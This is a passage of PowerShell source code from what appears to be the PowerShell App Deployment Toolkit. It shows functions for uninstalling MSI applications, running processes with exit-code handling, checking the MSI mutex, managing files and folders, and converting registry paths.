								Write-Log -Message "Preserve removal of application [$($installedApplication.DisplayName) $($installedApplication.Version)] because of wildcard match against [-FilterApplication] criteria." -Source ${CmdletName}
							}
						}
						ElseIf ($Filter[2] -eq 'Exact') {
							If ($installedApplication.($Filter[0]) -eq $Filter[1]) {
								[boolean]$addAppToRemoveList = $true
								Write-Log -Message "Preserve removal of application [$($installedApplication.DisplayName) $($installedApplication.Version)] because of exact match against [-FilterApplication] criteria." -Source ${CmdletName}
							}
						}
					}
				}
				Else {
					[boolean]$addAppToRemoveList = $true
				}

				
				If (($null -ne $ExcludeFromUninstall) -and ($ExcludeFromUninstall.Count)) {
					ForEach ($Exclude in $ExcludeFromUninstall) {
						If ($Exclude[2] -eq 'RegEx') {
							If ($installedApplication.($Exclude[0]) -match $Exclude[1]) {
								[boolean]$addAppToRemoveList = $false
								Write-Log -Message "Skipping removal of application [$($installedApplication.DisplayName) $($installedApplication.Version)] because of regex match against [-ExcludeFromUninstall] criteria." -Source ${CmdletName}
							}
						}
						ElseIf ($Exclude[2] -eq 'Contains') {
							If ($installedApplication.($Exclude[0]) -match [regex]::Escape($Exclude[1])) {
								[boolean]$addAppToRemoveList = $false
								Write-Log -Message "Skipping removal of application [$($installedApplication.DisplayName) $($installedApplication.Version)] because of contains match against [-ExcludeFromUninstall] criteria." -Source ${CmdletName}
							}
						}
						ElseIf ($Exclude[2] -eq 'WildCard') {
							If ($installedApplication.($Exclude[0]) -like $Exclude[1]) {
								[boolean]$addAppToRemoveList = $false
								Write-Log -Message "Skipping removal of application [$($installedApplication.DisplayName) $($installedApplication.Version)] because of wildcard match against [-ExcludeFromUninstall] criteria." -Source ${CmdletName}
							}
						}
						ElseIf ($Exclude[2] -eq 'Exact') {
							If ($installedApplication.($Exclude[0]) -eq $Exclude[1]) {
								[boolean]$addAppToRemoveList = $false
								Write-Log -Message "Skipping removal of application [$($installedApplication.DisplayName) $($installedApplication.Version)] because of exact match against [-ExcludeFromUninstall] criteria." -Source ${CmdletName}
							}
						}
					}
				}

				If ($addAppToRemoveList) {
					Write-Log -Message "Adding application to list for removal: [$($installedApplication.DisplayName) $($installedApplication.Version)]." -Source ${CmdletName}
					$removeMSIApplications.Add($installedApplication)
				}
			}
		}

		
		[hashtable]$ExecuteMSISplat =  @{ Action = 'Uninstall'; Path = '' }
		If ($ContinueOnError) { $ExecuteMSISplat.Add( 'ContinueOnError', $ContinueOnError) }
		If ($Parameters) { $ExecuteMSISplat.Add( 'Parameters', $Parameters) }
		ElseIf ($AddParameters) { $ExecuteMSISplat.Add( 'AddParameters', $AddParameters) }
		If ($LoggingOptions) { $ExecuteMSISplat.Add( 'LoggingOptions', $LoggingOptions) }
		If ($LogName) { $ExecuteMSISplat.Add( 'LogName', $LogName) }
		If ($PassThru) { $ExecuteMSISplat.Add( 'PassThru', $PassThru) }
		If ($IncludeUpdatesAndHotfixes) { $ExecuteMSISplat.Add( 'IncludeUpdatesAndHotfixes', $IncludeUpdatesAndHotfixes) }

		If (($null -ne $removeMSIApplications) -and ($removeMSIApplications.Count)) {
			ForEach ($removeMSIApplication in $removeMSIApplications) {
				Write-Log -Message "Remove application [$($removeMSIApplication.DisplayName) $($removeMSIApplication.Version)]." -Source ${CmdletName}
				$ExecuteMSISplat.Path = $removeMSIApplication.ProductCode
				If ($PassThru) {
					[psobject[]]$ExecuteResults += Execute-MSI @ExecuteMSISplat
				}
				Else {
					Execute-MSI @ExecuteMSISplat
				}
			}
		}
		Else {
			Write-Log -Message 'No applications found for removal. Continue...' -Source ${CmdletName}
		}
	}
	End {
		If ($PassThru) { Write-Output -InputObject $ExecuteResults }
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Execute-Process {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[Alias('FilePath')]
		[ValidateNotNullorEmpty()]
		[string]$Path,
		[Parameter(Mandatory=$false)]
		[Alias('Arguments')]
		[ValidateNotNullorEmpty()]
		[string[]]$Parameters,
		[Parameter(Mandatory=$false)]
		[switch]$SecureParameters = $false,
		[Parameter(Mandatory=$false)]
		[ValidateSet('Normal','Hidden','Maximized','Minimized')]
		[Diagnostics.ProcessWindowStyle]$WindowStyle = 'Normal',
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[switch]$CreateNoWindow = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$WorkingDirectory,
		[Parameter(Mandatory=$false)]
		[switch]$NoWait = $false,
		[Parameter(Mandatory=$false)]
		[switch]$PassThru = $false,
		[Parameter(Mandatory=$false)]
		[switch]$WaitForMsiExec = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int]$MsiExecWaitTime = $configMSIMutexWaitTime,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$IgnoreExitCodes,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			$private:returnCode = $null

			
			If (([IO.Path]::IsPathRooted($Path)) -and ([IO.Path]::HasExtension($Path))) {
				Write-Log -Message "[$Path] is a valid fully qualified path, continue." -Source ${CmdletName}
				If (-not (Test-Path -LiteralPath $Path -PathType 'Leaf' -ErrorAction 'Stop')) {
					Throw "File [$Path] not found."
				}
			}
			Else {
				
				[string]$PathFolders = $dirFiles
				
				[string]$PathFolders = $PathFolders + ';' + (Get-Location -PSProvider 'FileSystem').Path
				
				$env:PATH = $PathFolders + ';' + $env:PATH

				
				[string]$FullyQualifiedPath = Get-Command -Name $Path -CommandType 'Application' -TotalCount 1 -Syntax -ErrorAction 'Stop'

				
				$env:PATH = $env:PATH -replace [regex]::Escape($PathFolders + ';'), ''

				If ($FullyQualifiedPath) {
					Write-Log -Message "[$Path] successfully resolved to fully qualified path [$FullyQualifiedPath]." -Source ${CmdletName}
					$Path = $FullyQualifiedPath
				}
				Else {
					Throw "[$Path] contains an invalid path or file name."
				}
			}

			
			If (-not $WorkingDirectory) { $WorkingDirectory = Split-Path -Path $Path -Parent -ErrorAction 'Stop' }

			
			
			
			If (($Path -match 'msiexec') -or ($WaitForMsiExec)) {
				[timespan]$MsiExecWaitTimeSpan = New-TimeSpan -Seconds $MsiExecWaitTime
				[boolean]$MsiExecAvailable = Test-IsMutexAvailable -MutexName 'Global\_MSIExecute' -MutexWaitTimeInMilliseconds $MsiExecWaitTimeSpan.TotalMilliseconds
				Start-Sleep -Seconds 1
				If (-not $MsiExecAvailable) {
					
					[int32]$returnCode = 1618
					Throw 'Please complete in progress MSI installation before proceeding with this install.'
				}
			}

			Try {
				
				$env:SEE_MASK_NOZONECHECKS = 1

				
				$private:previousErrorActionPreference = $ErrorActionPreference
				$ErrorActionPreference = 'Stop'

				
				$processStartInfo = New-Object -TypeName 'System.Diagnostics.ProcessStartInfo' -ErrorAction 'Stop'
				$processStartInfo.FileName = $Path
				$processStartInfo.WorkingDirectory = $WorkingDirectory
				$processStartInfo.UseShellExecute = $false
				$processStartInfo.ErrorDialog = $false
				$processStartInfo.RedirectStandardOutput = $true
				$processStartInfo.RedirectStandardError = $true
				$processStartInfo.CreateNoWindow = $CreateNoWindow
				If ($Parameters) { $processStartInfo.Arguments = $Parameters }
				If ($windowStyle) { $processStartInfo.WindowStyle = $WindowStyle }
				$process = New-Object -TypeName 'System.Diagnostics.Process' -ErrorAction 'Stop'
				$process.StartInfo = $processStartInfo

				
				[scriptblock]$processEventHandler = { If (-not [string]::IsNullOrEmpty($EventArgs.Data)) { $Event.MessageData.AppendLine($EventArgs.Data) } }
				$stdOutBuilder = New-Object -TypeName 'System.Text.StringBuilder' -ArgumentList ''
				$stdOutEvent = Register-ObjectEvent -InputObject $process -Action $processEventHandler -EventName 'OutputDataReceived' -MessageData $stdOutBuilder -ErrorAction 'Stop'

				
				Write-Log -Message "Working Directory is [$WorkingDirectory]." -Source ${CmdletName}
				If ($Parameters) {
					If ($Parameters -match '-Command \&') {
						Write-Log -Message "Executing [$Path [PowerShell ScriptBlock]]..." -Source ${CmdletName}
					}
					Else {
						If ($SecureParameters) {
							Write-Log -Message "Executing [$Path (Parameters Hidden)]..." -Source ${CmdletName}
						}
						Else {
							Write-Log -Message "Executing [$Path $Parameters]..." -Source ${CmdletName}
						}
					}
				}
				Else {
					Write-Log -Message "Executing [$Path]..." -Source ${CmdletName}
				}
				[boolean]$processStarted = $process.Start()

				If ($NoWait) {
					Write-Log -Message 'NoWait parameter specified. Continuing without waiting for exit code...' -Source ${CmdletName}
				}
				Else {
					$process.BeginOutputReadLine()
					$stdErr = $($process.StandardError.ReadToEnd()).ToString() -replace $null,''

					
					$process.WaitForExit()

					
					While (-not ($process.HasExited)) { $process.Refresh(); Start-Sleep -Seconds 1 }

					
					Try {
						[int32]$returnCode = $process.ExitCode
					}
					Catch [System.Management.Automation.PSInvalidCastException] {
						
						[int32]$returnCode = 60013
					}

					
					If ($stdOutEvent) { Unregister-Event -SourceIdentifier $stdOutEvent.Name -ErrorAction 'Stop'; $stdOutEvent = $null }
					$stdOut = $stdOutBuilder.ToString() -replace $null,''

					If ($stdErr.Length -gt 0) {
						Write-Log -Message "Standard error output from the process: $stdErr" -Severity 3 -Source ${CmdletName}
					}
				}
			}
			Finally {
				
				If ($stdOutEvent) { Unregister-Event -SourceIdentifier $stdOutEvent.Name -ErrorAction 'Stop'}

				
				If ($process) { $process.Close() }

				
				Remove-Item -LiteralPath 'env:SEE_MASK_NOZONECHECKS' -ErrorAction 'SilentlyContinue'

				If ($private:previousErrorActionPreference) { $ErrorActionPreference = $private:previousErrorActionPreference }
			}

			If (-not $NoWait) {
				
				$ignoreExitCodeMatch = $false
				If ($ignoreExitCodes) {
					
					[int32[]]$ignoreExitCodesArray = $ignoreExitCodes -split ','
					ForEach ($ignoreCode in $ignoreExitCodesArray) {
						If ($returnCode -eq $ignoreCode) { $ignoreExitCodeMatch = $true }
					}
				}
				
				If ($ContinueOnError) { $ignoreExitCodeMatch = $true }

				
				If ($PassThru) {
					Write-Log -Message "Execution completed with exit code [$returnCode]." -Source ${CmdletName}
					[psobject]$ExecutionResults = New-Object -TypeName 'PSObject' -Property @{ ExitCode = $returnCode; StdOut = $stdOut; StdErr = $stdErr }
					Write-Output -InputObject $ExecutionResults
				}
				ElseIf ($ignoreExitCodeMatch) {
					Write-Log -Message "Execution complete and the exit code [$returncode] is being ignored." -Source ${CmdletName}
				}
				ElseIf (($returnCode -eq 3010) -or ($returnCode -eq 1641)) {
					Write-Log -Message "Execution completed successfully with exit code [$returnCode]. A reboot is required." -Severity 2 -Source ${CmdletName}
					Set-Variable -Name 'msiRebootDetected' -Value $true -Scope 'Script'
				}
				ElseIf (($returnCode -eq 1605) -and ($Path -match 'msiexec')) {
					Write-Log -Message "Execution failed with exit code [$returnCode] because the product is not currently installed." -Severity 3 -Source ${CmdletName}
				}
				ElseIf (($returnCode -eq -2145124329) -and ($Path -match 'wusa')) {
					Write-Log -Message "Execution failed with exit code [$returnCode] because the Windows Update is not applicable to this system." -Severity 3 -Source ${CmdletName}
				}
				ElseIf (($returnCode -eq 17025) -and ($Path -match 'fullfile')) {
					Write-Log -Message "Execution failed with exit code [$returnCode] because the Office Update is not applicable to this system." -Severity 3 -Source ${CmdletName}
				}
				ElseIf ($returnCode -eq 0) {
					Write-Log -Message "Execution completed successfully with exit code [$returnCode]." -Source ${CmdletName}
				}
				Else {
					[string]$MsiExitCodeMessage = ''
					If ($Path -match 'msiexec') {
						[string]$MsiExitCodeMessage = Get-MsiExitCodeMessage -MsiExitCode $returnCode
					}

					If ($MsiExitCodeMessage) {
						Write-Log -Message "Execution failed with exit code [$returnCode]: $MsiExitCodeMessage" -Severity 3 -Source ${CmdletName}
					}
					Else {
						Write-Log -Message "Execution failed with exit code [$returnCode]." -Severity 3 -Source ${CmdletName}
					}
					Exit-Script -ExitCode $returnCode
				}
			}
		}
		Catch {
			If ([string]::IsNullOrEmpty([string]$returnCode)) {
				[int32]$returnCode = 60002
				Write-Log -Message "Function failed, setting exit code to [$returnCode]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			}
			Else {
				Write-Log -Message "Execution completed with exit code [$returnCode]. Function failed. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			}
			If ($PassThru) {
				[psobject]$ExecutionResults = New-Object -TypeName 'PSObject' -Property @{ ExitCode = $returnCode; StdOut = If ($stdOut) { $stdOut } Else { '' }; StdErr = If ($stdErr) { $stdErr } Else { '' } }
				Write-Output -InputObject $ExecutionResults
			}
			Else {
				Exit-Script -ExitCode $returnCode
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-MsiExitCodeMessage {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[int32]$MsiExitCode
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message "Get message for exit code [$MsiExitCode]." -Source ${CmdletName}
			[string]$MsiExitCodeMsg = [PSADT.Msi]::GetMessageFromMsiExitCode($MsiExitCode)
			Write-Output -InputObject $MsiExitCodeMsg
		}
		Catch {
			Write-Log -Message "Failed to get message for exit code [$MsiExitCode]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Test-IsMutexAvailable {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateLength(1,260)]
		[string]$MutexName,
		[Parameter(Mandatory=$false)]
		[ValidateScript({($_ -ge -1) -and ($_ -le [int32]::MaxValue)})]
		[int32]$MutexWaitTimeInMilliseconds = 1
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		
		[timespan]$MutexWaitTime = [timespan]::FromMilliseconds($MutexWaitTimeInMilliseconds)
		If ($MutexWaitTime.TotalMinutes -ge 1) {
			[string]$WaitLogMsg = "$($MutexWaitTime.TotalMinutes) minute(s)"
		}
		ElseIf ($MutexWaitTime.TotalSeconds -ge 1) {
			[string]$WaitLogMsg = "$($MutexWaitTime.TotalSeconds) second(s)"
		}
		Else {
			[string]$WaitLogMsg = "$($MutexWaitTime.Milliseconds) millisecond(s)"
		}
		[boolean]$IsUnhandledException = $false
		[boolean]$IsMutexFree = $false
		[Threading.Mutex]$OpenExistingMutex = $null
	}
	Process {
		Write-Log -Message "Check to see if mutex [$MutexName] is available. Wait up to [$WaitLogMsg] for the mutex to become available." -Source ${CmdletName}
		Try {
			
			$private:previousErrorActionPreference = $ErrorActionPreference
			$ErrorActionPreference = 'Stop'

			
			[Threading.Mutex]$OpenExistingMutex = [Threading.Mutex]::OpenExisting($MutexName)
			
			$IsMutexFree = $OpenExistingMutex.WaitOne($MutexWaitTime, $false)
		}
		Catch [Threading.WaitHandleCannotBeOpenedException] {
			
			$IsMutexFree = $true
		}
		Catch [ObjectDisposedException] {
			
			$IsMutexFree = $true
		}
		Catch [UnauthorizedAccessException] {
			
			$IsMutexFree = $false
		}
		Catch [Threading.AbandonedMutexException] {
			
			$IsMutexFree = $true
		}
		Catch {
			$IsUnhandledException = $true
			
			Write-Log -Message "Unable to check if mutex [$MutexName] is available due to an unhandled exception. Will default to return value of [$true]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			$IsMutexFree = $true
		}
		Finally {
			If ($IsMutexFree) {
				If (-not $IsUnhandledException) {
					Write-Log -Message "Mutex [$MutexName] is available for an exclusive lock." -Source ${CmdletName}
				}
			}
			Else {
				If ($MutexName -eq 'Global\_MSIExecute') {
					
					Try {
						[string]$msiInProgressCmdLine = Get-WmiObject -Class 'Win32_Process' -Filter "name = 'msiexec.exe'" -ErrorAction 'Stop' | Where-Object { $_.CommandLine } | Select-Object -ExpandProperty 'CommandLine' | Where-Object { $_ -match '\.msi' } | ForEach-Object { $_.Trim() }
					}
					Catch { }
					Write-Log -Message "Mutex [$MutexName] is not available for an exclusive lock because the following MSI installation is in progress [$msiInProgressCmdLine]." -Severity 2 -Source ${CmdletName}
				}
				Else {
					Write-Log -Message "Mutex [$MutexName] is not available because another thread already has an exclusive lock on it." -Source ${CmdletName}
				}
			}

			If (($null -ne $OpenExistingMutex) -and ($IsMutexFree)) {
				
				$null = $OpenExistingMutex.ReleaseMutex()
				$OpenExistingMutex.Close()
			}
			If ($private:previousErrorActionPreference) { $ErrorActionPreference = $private:previousErrorActionPreference }
		}
	}
	End {
		Write-Output -InputObject $IsMutexFree

		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function New-Folder {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Path,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			If (-not (Test-Path -LiteralPath $Path -PathType 'Container')) {
				Write-Log -Message "Create folder [$Path]." -Source ${CmdletName}
				$null = New-Item -Path $Path -ItemType 'Directory' -ErrorAction 'Stop'
			}
			Else {
				Write-Log -Message "Folder [$Path] already exists." -Source ${CmdletName}
			}
		}
		Catch {
			Write-Log -Message "Failed to create folder [$Path]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to create folder [$Path]: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Remove-Folder {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Path,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
			If (Test-Path -LiteralPath $Path -PathType 'Container') {
				Try {
					Write-Log -Message "Delete folder [$path] recursively..." -Source ${CmdletName}
					Remove-Item -LiteralPath $Path -Force -Recurse -ErrorAction 'SilentlyContinue' -ErrorVariable '+ErrorRemoveFolder'
					If ($ErrorRemoveFolder) {
						Write-Log -Message "The following error(s) took place while deleting folder(s) and file(s) recursively from path [$path]. `n$(Resolve-Error -ErrorRecord $ErrorRemoveFolder)" -Severity 2 -Source ${CmdletName}
					}
				}
				Catch {
					Write-Log -Message "Failed to delete folder(s) and file(s) recursively from path [$path]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
					If (-not $ContinueOnError) {
						Throw "Failed to delete folder(s) and file(s) recursively from path [$path]: $($_.Exception.Message)"
					}
				}
			}
			Else {
				Write-Log -Message "Folder [$Path] does not exists..." -Source ${CmdletName}
			}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Copy-File {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string[]]$Path,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Destination,
		[Parameter(Mandatory=$false)]
		[switch]$Recurse = $false,
		[Parameter(Mandatory=$false)]
		[switch]$Flatten,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true,
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueFileCopyOnError = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			$null = $fileCopyError
			If ((-not ([IO.Path]::HasExtension($Destination))) -and (-not (Test-Path -LiteralPath $Destination -PathType 'Container'))) {
				Write-Log -Message "Destination folder does not exist, creating destination folder [$destination]." -Source ${CmdletName}
				$null = New-Item -Path $Destination -Type 'Directory' -Force -ErrorAction 'Stop'
			}

			if ($Flatten) {
				If ($Recurse) {
					Write-Log -Message "Copy file(s) recursively in path [$path] to destination [$destination] root folder, flattened." -Source ${CmdletName}
					If (-not $ContinueFileCopyOnError) {
						$null = Get-ChildItem -Path $path -Recurse | Where-Object {!($_.PSIsContainer)} | ForEach-Object {
							Copy-Item -Path ($_.FullName) -Destination $destination -Force -ErrorAction 'Stop'
						}
					}
					Else {
						$null = Get-ChildItem -Path $path -Recurse | Where-Object {!($_.PSIsContainer)} | ForEach-Object {
							Copy-Item -Path ($_.FullName) -Destination $destination -Force -ErrorAction 'SilentlyContinue' -ErrorVariable FileCopyError
						}
					}
				}
				Else {
					Write-Log -Message "Copy file in path [$path] to destination [$destination]." -Source ${CmdletName}
					If (-not $ContinueFileCopyOnError) {
						$null = Copy-Item -Path $path -Destination $destination -Force -ErrorAction 'Stop'
					}
					Else {
						$null = Copy-Item -Path $path -Destination $destination -Force -ErrorAction 'SilentlyContinue' -ErrorVariable FileCopyError
					}
				}
			}
			Else {
				$null = $FileCopyError
				If ($Recurse) {
					Write-Log -Message "Copy file(s) recursively in path [$path] to destination [$destination]." -Source ${CmdletName}
					If (-not $ContinueFileCopyOnError) {
						$null = Copy-Item -Path $Path -Destination $Destination -Force -Recurse -ErrorAction 'Stop'
					}
					Else {
						$null = Copy-Item -Path $Path -Destination $Destination -Force -Recurse -ErrorAction 'SilentlyContinue' -ErrorVariable FileCopyError
					}
				}
				Else {
					Write-Log -Message "Copy file in path [$path] to destination [$destination]." -Source ${CmdletName}
					If (-not $ContinueFileCopyOnError) {
						$null = Copy-Item -Path $Path -Destination $Destination -Force -ErrorAction 'Stop'
					}
					Else {
						$null = Copy-Item -Path $Path -Destination $Destination -Force -ErrorAction 'SilentlyContinue' -ErrorVariable FileCopyError
					}
				}
			}

			If ($fileCopyError) {
				Write-Log -Message "The following warnings were detected while copying file(s) in path [$path] to destination [$destination]. `n$FileCopyError" -Severity 2 -Source ${CmdletName}
			}
			Else {
				Write-Log -Message "File copy completed successfully." -Source ${CmdletName}
			}
		}
		Catch {
			Write-Log -Message "Failed to copy file(s) in path [$path] to destination [$destination]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to copy file(s) in path [$path] to destination [$destination]: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Remove-File {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,ParameterSetName='Path')]
		[ValidateNotNullorEmpty()]
		[string[]]$Path,
		[Parameter(Mandatory=$true,ParameterSetName='LiteralPath')]
		[ValidateNotNullorEmpty()]
		[string[]]$LiteralPath,
		[Parameter(Mandatory=$false)]
		[switch]$Recurse = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		[hashtable]$RemoveFileSplat =  @{ 'Recurse' = $Recurse
										  'Force' = $true
										  'ErrorVariable' = '+ErrorRemoveItem'
										}
		If ($ContinueOnError) {
			$RemoveFileSplat.Add('ErrorAction', 'SilentlyContinue')
		}
		Else {
			$RemoveFileSplat.Add('ErrorAction', 'Stop')
		}

		
		If ($PSCmdlet.ParameterSetName -eq 'Path') { [string[]]$SpecifiedPath = $Path } Else { [string[]]$SpecifiedPath = $LiteralPath }
		ForEach ($Item in $SpecifiedPath) {
			Try {
				If ($PSCmdlet.ParameterSetName -eq 'Path') {
					[string[]]$ResolvedPath += Resolve-Path -Path $Item -ErrorAction 'Stop' | Where-Object { $_.Path } | Select-Object -ExpandProperty 'Path' -ErrorAction 'Stop'
				}
				Else {
					[string[]]$ResolvedPath += Resolve-Path -LiteralPath $Item -ErrorAction 'Stop' | Where-Object { $_.Path } | Select-Object -ExpandProperty 'Path' -ErrorAction 'Stop'
				}
			}
			Catch [System.Management.Automation.ItemNotFoundException] {
				Write-Log -Message "Unable to resolve file(s) for deletion in path [$Item] because path does not exist." -Severity 2 -Source ${CmdletName}
			}
			Catch {
				Write-Log -Message "Failed to resolve file(s) for deletion in path [$Item]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				If (-not $ContinueOnError) {
					Throw "Failed to resolve file(s) for deletion in path [$Item]: $($_.Exception.Message)"
				}
			}
		}

		
		If ($ResolvedPath) {
			ForEach ($Item in $ResolvedPath) {
				Try {
					If (($Recurse) -and (Test-Path -LiteralPath $Item -PathType 'Container')) {
						Write-Log -Message "Delete file(s) recursively in path [$Item]..." -Source ${CmdletName}
					}
					ElseIf ((-not $Recurse) -and (Test-Path -LiteralPath $Item -PathType 'Container')) {
						Write-Log -Message "Skipping folder [$Item] because the Recurse switch was not specified"
					Continue
					}
					Else {
						Write-Log -Message "Delete file in path [$Item]..." -Source ${CmdletName}
					}
					$null = Remove-Item @RemoveFileSplat -LiteralPath $Item
				}
				Catch {
					Write-Log -Message "Failed to delete file(s) in path [$Item]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
					If (-not $ContinueOnError) {
						Throw "Failed to delete file(s) in path [$Item]: $($_.Exception.Message)"
					}
				}
			}
		}

		If ($ErrorRemoveItem) {
			Write-Log -Message "The following error(s) took place while removing file(s) in path [$SpecifiedPath]. `n$(Resolve-Error -ErrorRecord $ErrorRemoveItem)" -Severity 2 -Source ${CmdletName}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Convert-RegistryPath {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Key,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$SID
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		If ($Key -match '^HKLM:\\|^HKCU:\\|^HKCR:\\|^HKU:\\|^HKCC:\\|^HKPD:\\') {
			
			$key = $key -replace '^HKLM:\\', 'HKEY_LOCAL_MACHINE\'
			$key = $key -replace '^HKCR:\\', 'HKEY_CLASSES_ROOT\'
			$key = $key -replace '^HKCU:\\', 'HKEY_CURRENT_USER\'
			$key = $key -replace '^HKU:\\', 'HKEY_USERS\'
			$key = $key -replace '^HKCC:\\', 'HKEY_CURRENT_CONFIG\'
			$key = $key -replace '^HKPD:\\', 'HKEY_PERFORMANCE_DATA\'
		}
		ElseIf ($Key -match '^HKLM:|^HKCU:|^HKCR:|^HKU:|^HKCC:|^HKPD:') {
			
			$key = $key -replace '^HKLM:', 'HKEY_LOCAL_MACHINE\'
			$key = $key -replace '^HKCR:', 'HKEY_CLASSES_ROOT\'
			$key = $key -replace '^HKCU:', 'HKEY_CURRENT_USER\'
			$key = $key -replace '^HKU:', 'HKEY_USERS\'
			$key = $key -replace '^HKCC:', 'HKEY_CURRENT_CONFIG\'
			$key = $key -replace '^HKPD:', 'HKEY_PERFORMANCE_DATA\'
		}
		ElseIf ($Key -match '^HKLM\\|^HKCU\\|^HKCR\\|^HKU\\|^HKCC\\|^HKPD\\') {
			
			$key = $key -replace '^HKLM\\', 'HKEY_LOCAL_MACHINE\'
			$key = $key -replace '^HKCR\\', 'HKEY_CLASSES_ROOT\'
			$key = $key -replace '^HKCU\\', 'HKEY_CURRENT_USER\'
			$key = $key -replace '^HKU\\', 'HKEY_USERS\'
			$key = $key -replace '^HKCC\\', 'HKEY_CURRENT_CONFIG\'
			$key = $key -replace '^HKPD\\', 'HKEY_PERFORMANCE_DATA\'
		}

		If ($PSBoundParameters.ContainsKey('SID')) {
			
			If ($key -match '^HKEY_CURRENT_USER\\') { $key = $key -replace '^HKEY_CURRENT_USER\\', "HKEY_USERS\$SID\" }
		}

		
		If ($key -notmatch '^Registry::') {[string]$key = "Registry::$key" }

		If($Key -match '^Registry::HKEY_LOCAL_MACHINE|^Registry::HKEY_CLASSES_ROOT|^Registry::HKEY_CURRENT_USER|^Registry::HKEY_USERS|^Registry::HKEY_CURRENT_CONFIG|^Registry::HKEY_PERFORMANCE_DATA') {
			
			Write-Log -Message "Return fully qualified registry key path [$key]." -Source ${CmdletName}
			Write-Output -InputObject $key
		}
		Else{
			
			Throw "Unable to detect target registry hive in string [$key]."
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Test-RegistryValue {

	Param (
		[Parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]
		[ValidateNotNullOrEmpty()]$Key,
		[Parameter(Mandatory=$true,Position=1)]
